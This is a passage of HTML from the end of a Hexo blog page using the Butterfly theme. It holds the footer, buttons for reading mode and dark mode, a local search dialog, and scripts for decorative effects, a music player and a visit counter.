</span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js"></script><script defer src="/live2d-widget/autoload.js"></script><div class="aplayer no-destroy" data-id="746979029" data-server="netease" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="false" muted></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
